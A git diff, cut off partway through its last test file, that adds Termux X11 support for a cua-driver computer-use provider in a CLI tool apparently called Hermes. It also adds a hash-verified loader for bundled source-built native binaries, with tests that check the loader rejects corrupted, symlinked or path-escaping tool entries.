@@ -1,0 +1,1454 @@
+diff --git a/hermes_cli/tools_config.py b/hermes_cli/tools_config.py
+index 50f4a255..fac4f047 100644
+--- a/hermes_cli/tools_config.py
++++ b/hermes_cli/tools_config.py
+@@ -344,14 +344,15 @@ TOOL_CATEGORIES = {
+         ],
+     },
+     "computer_use": {
+-        "name": "Computer Use (macOS/Windows/Linux)", "icon": "🖱️",
+-        # Runtime backends ship for macOS, Windows, Linux (X11; Wayland via XWayland). Gaps surface via `computer-use doctor`.
+-        "platform_gate": ["darwin", "win32", "linux"],
++        "name": "Computer Use (desktop/X11)", "icon": "🖱️",
++        # Provider availability owns local/remote placement and the explicit Termux exception.
++        "setup_note": ("Termux X11 requires a native driver sealed into this Hermes package or an externally built "
++                       "driver selected by HERMES_CUA_DRIVER_CMD; it does not control Android phone apps."),
+         # cua-driver reads HOME/TMPDIR from the process env; HERMES_CUA_DRIVER_CMD selects a specific
+         # binary (e.g. a local build). There is no version-pin env var.
+         "providers": [
+-            _row("cua-driver (background)", "★ recommended · free · local",
+-                 "Background computer-use via cua-driver — does NOT steal your cursor or focus. Works with any model.",
++            _row("cua-driver", "★ recommended · free · local",
++                 "Desktop control via cua-driver. Foreground input requires separate approval. Works with any model.",
+                  computer_use_backend="cua", post_setup="cua_driver"),
+         ],
+     },
+diff --git a/hermes_cli/tools_config_cua.py b/hermes_cli/tools_config_cua.py
+index 10b00b28..05338f8a 100644
+--- a/hermes_cli/tools_config_cua.py
++++ b/hermes_cli/tools_config_cua.py
+@@ -88,6 +88,9 @@ def _cua_driver_contract_status(binary: Optional[str] = None) -> dict:
+ 
+ 
+ def _cua_driver_install_ready() -> bool:
++    from tools.computer_use.cua_backend_platform import local_cua_host_supported
++    if not local_cua_host_supported():
++        return False
+     state = _cua_driver_contract_status()
+     if not state.get("ready"):
+         return False
+@@ -110,7 +113,10 @@ def install_cua_driver(upgrade: bool = False, show_installer_progress: bool = Tr
+     Unattended callers should use PM ensure directly, without interactive host setup.
+     """
+     from pm import ensure
++    from tools.computer_use.cua_backend_platform import local_cua_host_supported, local_cua_unsupported_reason
+ 
++    if not local_cua_host_supported():
++        return _fail("    " + local_cua_unsupported_reason())
+     override = os.environ.get("HERMES_CUA_DRIVER_CMD", "").strip()
+     binary = _resolved_cua_driver_cmd()
+     fresh_install = binary is None
+@@ -159,8 +165,9 @@ def install_cua_driver(upgrade: bool = False, show_installer_progress: bool = Tr
+             return _fail("    cua-driver macOS app registration failed.")
+     if show_installer_progress:
+         _print_success(f"    cua-driver ready: {contract.get('version') or 'unknown version'}.")
++        from hermes_platform.host.runtime import is_termux
+         _print_cua_platform_notes(sys.platform == "win32", sys.platform == "linux",
+-                                  fresh_install=fresh_install)
++                                  fresh_install=fresh_install, is_termux_x11=is_termux())
+     return True
+ 
+ 
+@@ -256,8 +263,13 @@ def _repair_cua_driver_autostart_windows(driver_cmd: str, *, verbose: bool) -> b
+     return False
+ 
+ 
+-def _print_cua_platform_notes(is_windows: bool, is_linux: bool, *, fresh_install: bool) -> None:
+-    if is_windows:
++def _print_cua_platform_notes(is_windows: bool, is_linux: bool, *, fresh_install: bool,
++                              is_termux_x11: bool = False) -> None:
++    if is_termux_x11:
++        from tools.computer_use.cua_backend_platform import TERMUX_X11_HINT
++        _print_info("    " + TERMUX_X11_HINT)
++        _print_info("    Start the owned X11 desktop and use computer_use.no_overlay: true for this experiment.")
++    elif is_windows:
+         _print_info("    cua-driver may spawn a UIAccess worker (cua-driver-uia.exe);")
+         _print_info("    Windows/SmartScreen may prompt the first time it runs.")
+     elif is_linux:
+diff --git a/hermes_cli/tools_config_providers.py b/hermes_cli/tools_config_providers.py
+index 6bd4a182..86ec6850 100644
+--- a/hermes_cli/tools_config_providers.py
++++ b/hermes_cli/tools_config_providers.py
+@@ -127,7 +127,7 @@ _PLUGIN_ROW_BUILDERS = {
+     "Web Search & Extract": _plugin_web_search_providers,
+     "Browser Automation": _plugin_browser_providers,
+     "Text-to-Speech": _plugin_tts_providers,
+-    "Computer Use (macOS/Windows/Linux)": lambda: _computer_use_provider_rows()}
++    "Computer Use (desktop/X11)": lambda: _computer_use_provider_rows()}
+ 
+ 
+ def _computer_use_provider_rows() -> list[dict]:
+diff --git a/plugins/computer_use/cua/__init__.py b/plugins/computer_use/cua/__init__.py
+index 9c5573a2..fe74f576 100644
+--- a/plugins/computer_use/cua/__init__.py
++++ b/plugins/computer_use/cua/__init__.py
+@@ -8,17 +8,21 @@ from collections.abc import Callable
+ from tools.computer_use.backend import ComputerUseBackend, ComputerUseProvider
+ 
+ 
+-def _available_for_placement(platform: str, where: str, binary_available: Callable[[], bool]) -> bool:
++def _available_for_placement(platform: str, where: str, binary_available: Callable[[], bool], *,
++                             termux: bool = False, driver_selected: bool = False) -> bool:
+     """A remote desktop's driver belongs to that backend, independently of the client's OS."""
+     from tools.bot_desktop import placement
+     if where == placement.TERMINAL:
+         return True  # The sandbox's actual binary and contract are checked on first use.
+-    return platform in ("darwin", "win32", "linux") and binary_available()
++    from tools.computer_use.cua_backend_platform import local_cua_supported
++    return (where == placement.GATEWAY
++            and local_cua_supported(platform, termux=termux, driver_selected=driver_selected)
++            and binary_available())
+ 
+ 
+ class CuaDriverProvider(ComputerUseProvider):
+     name = "cua"
+-    display_name = "cua-driver (background)"
++    display_name = "cua-driver"
+ 
+     def create_backend(self, *, permission_mode: str) -> ComputerUseBackend:
+         from tools.computer_use.cua_backend import CuaDriverBackend
+@@ -28,7 +32,15 @@ class CuaDriverProvider(ComputerUseProvider):
+         """Probe a local desktop driver, or admit the explicitly placed remote Linux desktop."""
+         from tools.bot_desktop import placement
+         from tools.computer_use.cua_backend_driver import cua_driver_binary_available
+-        return _available_for_placement(sys.platform, placement.resolve().where, cua_driver_binary_available)
++        from hermes_platform.host.runtime import is_termux
++        from tools.computer_use.cua_backend_driver import resolve_cua_driver_cmd
++        where = placement.resolve().where
++        # A remote driver must not resolve any local override, even for passive availability.
++        termux = is_termux() if where == placement.GATEWAY else False
++        return _available_for_placement(
++            sys.platform, where, cua_driver_binary_available, termux=termux,
++            driver_selected=bool(resolve_cua_driver_cmd()) if termux else False,
++        )
+ 
+ 
+ def register(ctx):
+diff --git a/pm/bundled_tools.py b/pm/bundled_tools.py
+new file mode 100644
+index 00000000..de3cee9a
+--- /dev/null
++++ b/pm/bundled_tools.py
+@@ -0,0 +1,230 @@
++"""Exact source-built tools owned by the executing sealed payload.
++
++These descriptors are separate from downloadable PM artifacts. No URL is
++invented for a native build, and an environment override cannot select one.
++"""
++from __future__ import annotations
++
++from dataclasses import dataclass
++import hashlib
++import json
++import os
++from pathlib import Path, PurePosixPath
++import re
++import shutil
++
++from pm.package import InstallError, Package
++
++CATALOG_NAME = "bundled-tools.json"
++SOURCE_NAME = "source-receipt.json"
++_REMEDY = "reinstall or rebuild the complete signed Termux package"
++_ROW_KEYS = {
++    "name", "version", "target", "entry", "binary", "binary_sha256",
++    "source_receipt", "source_receipt_sha256", "tree_sha256",
++}
++
++
++@dataclass(frozen=True)
++class SourceBuiltTool:
++    name: str
++    version: str
++    target: str
++    path: Path
++    binary: Path
++    environment: dict
++
++
++def _sha(path: Path) -> str:
++    digest = hashlib.sha256()
++    with path.open("rb") as stream:
++        for block in iter(lambda: stream.read(1024 * 1024), b""):
++            digest.update(block)
++    return digest.hexdigest()
++
++
++def _digest(value: object) -> bool:
++    return isinstance(value, str) and re.fullmatch(r"[a-f0-9]{64}", value) is not None
++
++
++def _path(payload: Path, relative: str) -> Path:
++    from pm.filesystem import is_junction
++
++    parts = PurePosixPath(relative)
++    if (not relative or parts.is_absolute() or "\\" in relative or ":" in relative
++            or any(part in ("", ".", "..") for part in relative.split("/"))):
++        raise ValueError("invalid source-built tool path")
++    path = payload
++    for part in parts.parts:
++        path = path / part
++        if path.is_symlink() or is_junction(path):
++            raise ValueError("source-built tool paths must not contain links")
++    if not path.resolve().is_relative_to(payload):
++        raise ValueError("source-built tool path escapes payload")
++    return path
++
++
++def _pin(package: Package, target: str, version: str) -> dict:
++    pin = getattr(package, "source_built_receipts", {}).get(target)
++    if (not isinstance(pin, dict) or set(pin) != {"version", "sha256"}
++            or pin["version"] != version or not _digest(pin["sha256"])):
++        raise ValueError("source-built tool has no reviewed source pin for this version and target")
++    return pin
++
++
++def _validate(payload: Path, row: dict, target: str, lock) -> SourceBuiltTool:
++    from pm.registry import get_package
++    from pm.store import tree_digest
++
++    if not isinstance(row, dict) or set(row) != _ROW_KEYS:
++        raise ValueError("malformed source-built tool row")
++    if not all(isinstance(row[key], str) and row[key] for key in _ROW_KEYS):
++        raise ValueError("malformed source-built tool identity")
++    package = get_package(row["name"])
++    version = lock.version(package.name)
++    if row["target"] != target or row["version"] != version:
++        raise ValueError("source-built tool target or locked version mismatch")
++    pin = _pin(package, target, version)
++    if row["source_receipt_sha256"] != pin["sha256"]:
++        raise ValueError("source-built tool source identity mismatch")
++    if not all(_digest(row[key]) for key in ("binary_sha256", "tree_sha256")):
++        raise ValueError("malformed source-built tool digest")
++    expected_entry = "tools/" + package.store_entry(version, target)
++    if row["entry"] != expected_entry or row["source_receipt"] != SOURCE_NAME:
++        raise ValueError("source-built tool entry is not canonical")
++    entry = _path(payload, row["entry"])
++    binary = _path(payload, row["entry"] + "/" + row["binary"])
++    source = _path(payload, row["entry"] + "/" + SOURCE_NAME)
++    if package.binary(entry, target) != binary:
++        raise ValueError("source-built tool binary is not the package executable")
++    if not entry.is_dir() or not binary.is_file() or not source.is_file():
++        raise ValueError("source-built tool files are missing")
++    if set(p.name for p in entry.iterdir()) != {row["binary"], SOURCE_NAME}:
++        raise ValueError("unexpected source-built tool entry contents")
++    if _sha(source) != pin["sha256"]:
++        raise ValueError("source-built tool source receipt was changed")
++    if _sha(binary) != row["binary_sha256"] or tree_digest(entry) != row["tree_sha256"]:
++        raise ValueError("source-built tool bytes were changed")
++    # Byte/architecture validation only: passive selection must not execute a tool.
++    reason = Package.verify(package, entry, target)
++    if reason:
++        raise ValueError("source-built tool binary is incompatible: " + reason)
++    if os.name != "nt" and not os.access(binary, os.X_OK):
++        raise ValueError("source-built tool executable bit is missing")
++    return SourceBuiltTool(package.name, version, target, entry, binary, package.env(entry, target))
++
++
++def _read(payload: Path, manifest: dict, target: str, lock) -> dict[str, SourceBuiltTool]:
++    if manifest.get("target") != target:
++        raise ValueError("source-built tool payload target mismatch")
++    descriptor = manifest["bundled_tools"]
++    if (not isinstance(descriptor, dict) or set(descriptor) != {"path", "sha256"}
++            or descriptor["path"] != CATALOG_NAME or not _digest(descriptor["sha256"])):
++        raise ValueError("malformed source-built tool descriptor")
++    catalog = _path(payload, CATALOG_NAME)
++    if not catalog.is_file() or catalog.stat().st_size > 65536:
++        raise ValueError("source-built tool catalog is missing or too large")
++    if _sha(catalog) != descriptor["sha256"]:
++        raise ValueError("source-built tool catalog SHA-256 mismatch")
++    document = json.loads(catalog.read_bytes())
++    if (not isinstance(document, dict) or set(document) != {"schema_version", "tools"}
++            or type(document["schema_version"]) is not int or document["schema_version"] != 1
++            or not isinstance(document["tools"], list) or not document["tools"]):
++        raise ValueError("malformed source-built tool catalog")
++    tools = {}
++    for row in document["tools"]:
++        tool = _validate(payload, row, target, lock)
++        if tool.name in tools:
++            raise ValueError("duplicate source-built tool")
++        tools[tool.name] = tool
++    return tools
++
++
++def selected_tool(name: str, *, target: str | None = None) -> SourceBuiltTool | None:
++    """Select only a reviewed tool in the executing PM tree's sealed payload."""
++    from pm.environments import _payload_manifest
++    from pm.lock import Lockfile
++    from pm.paths import repo_root
++    from pm.registry import get_package
++    from pm.store import current_target
++
++    target = target or current_target()
++    package = get_package(name)
++    # Ordinary downloadable tools never depend on this optional catalog.
++    if target not in getattr(package, "source_built_receipts", {}):
++        return None
++    root = repo_root().resolve()
++    manifest = _payload_manifest(root)
++    if not manifest or "bundled_tools" not in manifest:
++        return None
++    try:
++        tools = _read(root.parent, manifest, target, Lockfile(root / "pm/lock.json"))
++        return tools.get(name)
++    except (OSError, ValueError, TypeError, KeyError) as exc:
++        raise InstallError(name, f"invalid sealed source-built tool: {exc}", _REMEDY) from exc
++
++
++def stage_source_built_tool(
++    payload: Path, *, name: str, target: str, binary: Path,
++    binary_sha256: str, source_receipt: Path,
++) -> dict:
++    """Publish one verified native build into a completed build-owned payload.
++
++    Call after all binary mutations. This writes its own catalog/manifest
++    descriptor; it does not impersonate remote artifacts in tools/facts.json.
++    """
++    from pm.environments import _payload_manifest
++    from pm.filesystem import durable_write_bytes
++    from pm.lock import Lockfile
++    from pm.registry import get_package
++    from pm.store import tree_digest
++
++    payload = payload.resolve()
++    manifest_path = _path(payload, "manifest.json")
++    manifest = json.loads(manifest_path.read_bytes())
++    repo = _path(payload, manifest["repo"])
++    if _payload_manifest(repo) != manifest or manifest.get("target") != target:
++        raise ValueError("source-built tools require a valid assembled target payload")
++    if "bundled_tools" in manifest or (payload / CATALOG_NAME).exists():
++        raise FileExistsError("source-built tool catalog already exists")
++    package = get_package(name)
++    lock = Lockfile(repo / "pm/lock.json")
++    version = lock.version(name)
++    pin = _pin(package, target, version)
++    if (not _digest(binary_sha256) or binary.is_symlink() or not binary.is_file()
++            or _sha(binary) != binary_sha256):
++        raise ValueError("native build binary SHA-256 mismatch")
++    if (source_receipt.is_symlink() or not source_receipt.is_file()
++            or source_receipt.stat().st_size > 65536 or _sha(source_receipt) != pin["sha256"]):
++        raise ValueError("native build source receipt does not match the reviewed recipe")
++    entry_rel = "tools/" + package.store_entry(version, target)
++    entry = _path(payload, entry_rel)
++    if entry.exists():
++        raise FileExistsError(entry)
++    executable = package.binary(entry, target)
++    if executable is None or executable.parent != entry or executable.name == SOURCE_NAME:
++        raise ValueError("source-built tool must declare one direct executable")
++    entry.mkdir(parents=True)
++    try:
++        shutil.copyfile(binary, executable)
++        executable.chmod(0o755)
++        shutil.copyfile(source_receipt, entry / SOURCE_NAME)
++        (entry / SOURCE_NAME).chmod(0o644)
++        row = {
++            "name": name, "version": version, "target": target,
++            "entry": entry_rel, "binary": executable.name,
++            "binary_sha256": binary_sha256, "source_receipt": SOURCE_NAME,
++            "source_receipt_sha256": pin["sha256"], "tree_sha256": tree_digest(entry),
++        }
++        _validate(payload, row, target, lock)
++        data = (json.dumps({"schema_version": 1, "tools": [row]}, indent=2, sort_keys=True) + "\n").encode()
++        descriptor = {"path": CATALOG_NAME, "sha256": hashlib.sha256(data).hexdigest()}
++        catalog = payload / CATALOG_NAME
++        durable_write_bytes(catalog, data)
++        catalog.chmod(0o644)
++        manifest["bundled_tools"] = descriptor
++        durable_write_bytes(manifest_path, (json.dumps(manifest, indent=2) + "\n").encode())
++        manifest_path.chmod(0o644)
++        return {"descriptor": descriptor, "tool": row}
++    except BaseException:
++        shutil.rmtree(entry)
++        raise
+diff --git a/pm/install.py b/pm/install.py
+index f7db502f..7bd507bf 100644
+--- a/pm/install.py
++++ b/pm/install.py
+@@ -85,6 +85,11 @@ def _installed_location(package: Package, lockfile: Lockfile, target: str, *,
+                         verify: bool = False, allow_outdated: bool = False,
+                         roots: tuple[Path, ...] | None = None):
+     """Prefer the current pin. An explicit read may retain a prior PM install."""
++    # Source-built-only targets cannot fall through to the legacy version/path
++    # check with no artifact identity. Their separate sealed descriptor owns selection.
++    if (target in getattr(package, "source_built_receipts", {})
++            and not lockfile.artifacts(package.name, target)):
++        return None
+     search_roots = dict.fromkeys(roots if roots is not None else (paths.store_root(), paths.writable_store_root()))
+     fallback = None
+     for root in search_roots:
+@@ -122,6 +127,10 @@ def installed_package(name: str, *, allow_outdated: bool = False) -> InstalledPa
+     if package.internal:
+         raise ValueError(f"{name} is internal PM tooling, not an application package")
+     target = current_target()
++    from pm.bundled_tools import selected_tool
++    built = selected_tool(name, target=target)
++    if built is not None:
++        return InstalledPackage(built.path, built.version, built.binary)
+     location = _installed_location(package, _lockfile(), target, allow_outdated=allow_outdated)
+     if location is None:
+         return None
+@@ -200,7 +209,10 @@ def enabled_extras() -> list[str]:
+ 
+ 
+ def is_installed(name: str) -> bool:
+-    return _installed_location(get_package(name), _lockfile(), current_target()) is not None
++    from pm.bundled_tools import selected_tool
++    target = current_target()
++    return (selected_tool(name, target=target) is not None
++            or _installed_location(get_package(name), _lockfile(), target) is not None)
+ 
+ 
+ def sealed() -> bool:
+@@ -552,7 +564,10 @@ def ensure(
+     if _operation is not None:
+         _operation.lock()
+     missing = []
++    from pm.bundled_tools import selected_tool
+     for package in chain:
++        if selected_tool(package.name, target=target) is not None:
++            continue
+         identity = (package.name, lockfile.version(package.name), target,
+                     json.dumps(_identity(lockfile, package.name, target), sort_keys=True))
+         if identity in checked:
+@@ -589,6 +604,11 @@ def env_for(*names: str, base_env: Optional[dict] = None) -> dict[str, str]:
+         for package in chain:
+             if package.internal:
+                 continue
++            from pm.bundled_tools import selected_tool
++            built = selected_tool(package.name, target=target)
++            if built is not None:
++                diffs.append(built.environment)
++                continue
+             location = _installed_location(package, lockfile, target)
+             if location:
+                 facts, store = location
+diff --git a/pm/packages.py b/pm/packages.py
+index f0f4a7d1..67feb3a1 100644
+--- a/pm/packages.py
++++ b/pm/packages.py
+@@ -927,6 +927,14 @@ class Ripgrep(BinaryPackage):
+ @register
+ class CuaDriver(BinaryPackage):
+     name = "cua-driver"
++    # An unpublished native build is admitted only by the executing sealed payload.
++    # This exact receipt binds the reviewed source, source patch, locks and crate adapters.
++    source_built_receipts = {
++        "linux-arm64-bionic": {
++            "version": "0.21.0",
++            "sha256": "47c43e002a868f0387e02142a9c623e5790c2656076959688abc3e93a6ec6167",
++        },
++    }
+     optional = True
+     # Computer use's only OS path, so the default install carries it.
+     default = True
+diff --git a/tests/hermes_cli/test_cua_termux_setup.py b/tests/hermes_cli/test_cua_termux_setup.py
+new file mode 100644
+index 00000000..b1673651
+--- /dev/null
++++ b/tests/hermes_cli/test_cua_termux_setup.py
+@@ -0,0 +1,29 @@
++"""Termux CUA setup guidance limits sealed or explicit drivers to X11."""
++
++from hermes_cli.tools_config_cua import _print_cua_platform_notes
++
++
++def test_termux_guidance_does_not_request_macos_permissions(capsys):
++    _print_cua_platform_notes(False, False, fresh_install=True, is_termux_x11=True)
++    output = capsys.readouterr().out
++    assert "Termux X11" in output
++    assert "HERMES_CUA_DRIVER_CMD" in output
++    assert "Android phone" in output
++    assert "System Settings" not in output
++    assert "CuaDriver.app" not in output
++
++
++def test_computer_use_category_keeps_external_provider_discovery(tmp_path, monkeypatch):
++    from hermes_cli.tools_config import TOOL_CATEGORIES
++    from hermes_cli.tools_config_providers import _PLUGIN_ROW_BUILDERS
++
++    home = tmp_path / "profile"
++    provider = home / "plugins" / "owned-fixture"
++    provider.mkdir(parents=True)
++    (provider / "__init__.py").write_text("# register_computer_use_provider\n", encoding="utf-8")
++    (provider / "plugin.yaml").write_text(
++        "name: owned-fixture\ndescription: An unselected fixture provider\n", encoding="utf-8",
++    )
++    monkeypatch.setenv("HERMES_HOME", str(home))
++    rows = _PLUGIN_ROW_BUILDERS[TOOL_CATEGORIES["computer_use"]["name"]]()
++    assert any(row["computer_use_backend"] == "owned-fixture" for row in rows)
+diff --git a/tests/pm/test_bundled_tools.py b/tests/pm/test_bundled_tools.py
+new file mode 100644
+index 00000000..3b5b4c6e
+--- /dev/null
++++ b/tests/pm/test_bundled_tools.py
+@@ -0,0 +1,225 @@
++"""Source-built PM tools require the executing payload and exact build identity."""
++from __future__ import annotations
++
++import hashlib
++import json
++from pathlib import Path
++import shutil
++import sys
++from types import SimpleNamespace
++
++import pytest
++
++from pm import bundled_tools, paths, registry
++from pm.lock import Facts, Lockfile
++from pm.package import InstallError, Package
++from pm.store import current_target, tree_digest
++
++
++def digest(path):
++    return hashlib.sha256(path.read_bytes()).hexdigest()
++
++
++@pytest.fixture
++def built(tmp_path, monkeypatch):
++    target = current_target()
++    payload = tmp_path / "payload"
++    repo = payload / "app"
++    (repo / "pm").mkdir(parents=True)
++    (payload / "tools").mkdir()
++    source = tmp_path / "source.json"
++    source.write_bytes(b'{"schema":1,"commit":"1111111111111111111111111111111111111111"}\n')
++
++    class FixtureTool(Package):
++        name = "fixture-source-tool"
++        source_built_receipts = {target: {"version": "1.0.0", "sha256": digest(source)}}
++        gaps = {target: "fixture has no remote artifact"}
++
++        def binary(self, entry, target):
++            return entry / ("tool.exe" if target.startswith("win32") else "tool")
++
++        def env(self, entry, target):
++            return {"PATH": [str(entry)]}
++
++    package = FixtureTool()
++    registry.get_package("cua-driver")  # Populate builtins before the fixture registration.
++    monkeypatch.setitem(registry._packages, package.name, package)
++    lock_path = repo / "pm/lock.json"
++    lock_path.write_text(json.dumps({"schema": 1, "packages": {
++        package.name: {"version": "1.0.0", "artifacts": {}},
++    }}), encoding="utf-8")
++    manifest = {"schema": 1, "target": target, "repo": "app", "venv": "venv",
++                "store": "tools", "runtime": {"commands": {"hermes": "bin/hermes"}}}
++    (payload / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
++    monkeypatch.setattr(paths, "repo_root", lambda: repo)
++    monkeypatch.setattr(paths, "lockfile_path", lambda: lock_path)
++    monkeypatch.delenv("HERMES_RUNTIME_DIR", raising=False)
++    binary = Path(sys.executable).resolve()
++    staged = bundled_tools.stage_source_built_tool(
++        payload, name=package.name, target=target, binary=binary,
++        binary_sha256=digest(binary), source_receipt=source,
++    )
++    return SimpleNamespace(payload=payload, repo=repo, package=package, target=target,
++                           staged=staged, lock_path=lock_path,
++                           entry=payload / staged["tool"]["entry"])
++
++
++def rewrite_catalog(built, change):
++    catalog = built.payload / bundled_tools.CATALOG_NAME
++    document = json.loads(catalog.read_bytes())
++    change(document)
++    catalog.write_text(json.dumps(document), encoding="utf-8")
++    manifest_path = built.payload / "manifest.json"
++    manifest = json.loads(manifest_path.read_bytes())
++    manifest["bundled_tools"]["sha256"] = digest(catalog)
++    manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
++
++
++def test_existing_pm_interfaces_select_exact_baked_bytes_without_download(built, monkeypatch):
++    import importlib
++    install = importlib.import_module("pm.install")
++    monkeypatch.setattr(install, "_install", lambda *a, **kw: pytest.fail("unexpected acquisition"))
++
++    selected = install.installed_package(built.package.name)
++    assert selected.path == built.entry
++    assert selected.binary == built.package.binary(built.entry, built.target)
++    assert selected.version == "1.0.0"
++    assert install.is_installed(built.package.name)
++    runner = install.ensure(built.package.name, explicit=True, base_env={"PATH": "original"})
++    assert runner.env["PATH"].split(__import__("os").pathsep)[0] == str(built.entry)
++    assert install.env_for(built.package.name, base_env={"PATH": ""})["PATH"] == str(built.entry)
++    assert not (built.payload / "tools/facts.json").exists()
++    assert Lockfile(built.lock_path).artifacts(built.package.name, built.target) == []
++
++
++@pytest.mark.parametrize("damage", [
++    "catalog-bytes", "binary-bytes", "source-bytes", "source-identity",
++    "binary-digest", "tree-digest", "target", "version", "entry-path", "binary-path",
++    "duplicate", "extra-file", "descriptor-path", "descriptor-hash",
++])
++def test_corruption_fails_before_a_driver_can_be_selected(built, damage):
++    row = built.staged["tool"]
++    if damage == "catalog-bytes":
++        with (built.payload / bundled_tools.CATALOG_NAME).open("ab") as stream:
++            stream.write(b" ")
++    elif damage == "binary-bytes":
++        with (built.entry / row["binary"]).open("ab") as stream:
++            stream.write(b"corruption")
++    elif damage == "source-bytes":
++        (built.entry / bundled_tools.SOURCE_NAME).write_bytes(b"wrong source")
++    elif damage == "extra-file":
++        (built.entry / "unexpected.dll").write_bytes(b"unexpected")
++    elif damage.startswith("descriptor-"):
++        p = built.payload / "manifest.json"
++        manifest = json.loads(p.read_bytes())
++        manifest["bundled_tools"]["path" if damage.endswith("path") else "sha256"] = (
++            "../untrusted.json" if damage.endswith("path") else "0" * 64)
++        p.write_text(json.dumps(manifest), encoding="utf-8")
++    else:
++        def change(document):
++            selected = document["tools"][0]
++            if damage == "duplicate":
++                document["tools"].append(dict(selected))
++                return
++            key, value = {
++                "source-identity": ("source_receipt_sha256", "0" * 64),
++                "binary-digest": ("binary_sha256", "0" * 64),
++                "tree-digest": ("tree_sha256", "0" * 64),
++                "target": ("target", "unsupported-target"),
++                "version": ("version", "9.9.9"),
++                "entry-path": ("entry", "../outside"),
++                "binary-path": ("binary", "../outside"),
++            }[damage]
++            selected[key] = value
++        rewrite_catalog(built, change)
++    with pytest.raises(InstallError, match="invalid sealed source-built tool"):
++        bundled_tools.selected_tool(built.package.name)
++
++
++@pytest.mark.parametrize("link_kind", ["catalog", "source", "entry"])
++def test_symlinked_identity_or_entry_is_not_admitted(built, tmp_path, link_kind):
++    path = {"catalog": built.payload / bundled_tools.CATALOG_NAME,
++            "source": built.entry / bundled_tools.SOURCE_NAME,
++            "entry": built.entry}[link_kind]
++    saved = tmp_path / ("outside-" + path.name)
++    path.rename(saved)
++    try:
++        path.symlink_to(saved, target_is_directory=saved.is_dir())
++    except OSError as exc:
++        saved.rename(path)
++        pytest.skip(f"host cannot create test symlink: {exc}")
++    with pytest.raises(InstallError, match="links"):
++        bundled_tools.selected_tool(built.package.name)
++
++
++@pytest.mark.parametrize("remove_executing_catalog", [False, True])
++def test_environment_overrides_cannot_supply_baked_tool_authority(built, tmp_path, monkeypatch, remove_executing_catalog):
++    decoy = tmp_path / "decoy"
++    shutil.copytree(built.payload, decoy)
++    monkeypatch.setenv("HERMES_RUNTIME_DIR", str(decoy / "tools"))
++    monkeypatch.setenv("HERMES_INSTALL_ROOT", str(decoy / "app"))
++    if remove_executing_catalog:
++        (built.payload / bundled_tools.CATALOG_NAME).unlink()
++        with pytest.raises(InstallError):
++            bundled_tools.selected_tool(built.package.name)
++    else:
++        assert bundled_tools.selected_tool(built.package.name).path == built.entry
++
++
++def test_unsupported_target_and_changed_lock_cannot_reuse_a_native_tool(built):
++    assert bundled_tools.selected_tool(built.package.name, target="unsupported-target") is None
++    lock = json.loads(built.lock_path.read_bytes())
++    lock["packages"][built.package.name]["version"] = "2.0.0"
++    built.lock_path.write_text(json.dumps(lock), encoding="utf-8")
++    with pytest.raises(InstallError, match="locked version"):
++        bundled_tools.selected_tool(built.package.name)
++
++
++def test_unpinned_legacy_fact_cannot_replace_a_missing_source_descriptor(built):
++    import importlib
++    install = importlib.import_module("pm.install")
++    (built.payload / "manifest.json").write_text(json.dumps({
++        "schema": 1, "target": built.target, "repo": "app", "venv": "venv",
++        "store": "tools", "runtime": {"commands": {"hermes": "bin/hermes"}},
++    }), encoding="utf-8")
++    Facts(built.payload / "tools/facts.json").record(
++        built.package.name, "1.0.0", built.entry.name, built.package.env(built.entry, built.target),
++        built.payload / "tools", target=built.target, digest=tree_digest(built.entry))
++    assert install.installed_package(built.package.name) is None
++    assert not install.is_installed(built.package.name)
++
++
++def test_ordinary_remote_artifact_identity_is_unchanged(built, monkeypatch):
++    import importlib
++    install = importlib.import_module("pm.install")
++
++    class RemoteTool(Package):
++        name = "ordinary-remote-tool"
++
++        def binary(self, entry, target):
++            return entry / ("tool.exe" if target.startswith("win32") else "tool")
++
++        def env(self, entry, target):
++            return {"PATH": [str(entry)]}
++
++    package = RemoteTool()
++    monkeypatch.setitem(registry._packages, package.name, package)
++    lock = json.loads(built.lock_path.read_bytes())
++    lock["packages"][package.name] = {"version": "2.0.0", "artifacts": {
++        built.target: {"url": "https://example.invalid/fixture.zip", "sha256": "1" * 64},
++    }}
++    built.lock_path.write_text(json.dumps(lock), encoding="utf-8")
++    entry = built.payload / "tools" / package.store_entry("2.0.0", built.target)
++    entry.mkdir()
++    binary = package.binary(entry, built.target)
++    shutil.copyfile(Path(sys.executable).resolve(), binary)
++    binary.chmod(0o755)
++    Facts(built.payload / "tools/facts.json").record(
++        package.name, "2.0.0", entry.name, package.env(entry, built.target),
++        built.payload / "tools", target=built.target, artifacts=["1" * 64], digest=tree_digest(entry))
++    (built.payload / bundled_tools.CATALOG_NAME).write_bytes(b"corrupt unrelated source catalog")
++    selected = install.installed_package(package.name)
++    assert selected.binary == binary
++    assert install.is_installed(package.name)
++    monkeypatch.setattr(install, "_install", lambda *a, **kw: pytest.fail("unexpected download"))
++    assert install.ensure(package.name, explicit=True).env["PATH"].split(__import__("os").pathsep)[0] == str(entry)
+diff --git a/tests/tools/test_computer_use_termux_override.py b/tests/tools/test_computer_use_termux_override.py
+new file mode 100644
+index 00000000..69b2d25d
+--- /dev/null
++++ b/tests/tools/test_computer_use_termux_override.py
+@@ -0,0 +1,138 @@
++"""Selected Termux X11 admission requires a validated driver, never phone UI support."""
++
++import json
++import sys
++
++import pytest
++
++from plugins.computer_use.cua import _available_for_placement
++from tools.bot_desktop import placement
++
++
++@pytest.mark.parametrize("platform", ["android", "linux"])
++def test_termux_requires_a_selected_usable_driver(platform):
++    def absent():
++        return False
++
++    assert _available_for_placement(
++        platform, placement.GATEWAY, lambda: True,
++        termux=True, driver_selected=True,
++    )
++    assert not _available_for_placement(
++        platform, placement.GATEWAY, lambda: True,
++        termux=True, driver_selected=False,
++    )
++    assert not _available_for_placement(
++        platform, placement.GATEWAY, absent,
++        termux=True, driver_selected=True,
++    )
++
++
++@pytest.mark.parametrize("where", [placement.GATEWAY, placement.REFUSED])
++def test_external_binary_does_not_admit_an_android_phone_host(where):
++    assert not _available_for_placement(
++        "android", where, lambda: True, termux=False, driver_selected=True,
++    )
++
++
++def test_remote_placement_never_resolves_the_local_external_driver():
++    def forbidden():
++        pytest.fail("a remotely placed driver must remain inside its selected terminal backend")
++
++    assert _available_for_placement(
++        "android", placement.TERMINAL, forbidden,
++        termux=True, driver_selected=False,
++    )
++    assert not _available_for_placement(
++        "android", placement.REFUSED, forbidden,
++        termux=True, driver_selected=True,
++    )
++
++
++def test_external_lookup_uses_only_the_exact_override(tmp_path, monkeypatch):
++    import pm
++    from tools.computer_use.cua_backend_platform import configured_external_driver
++
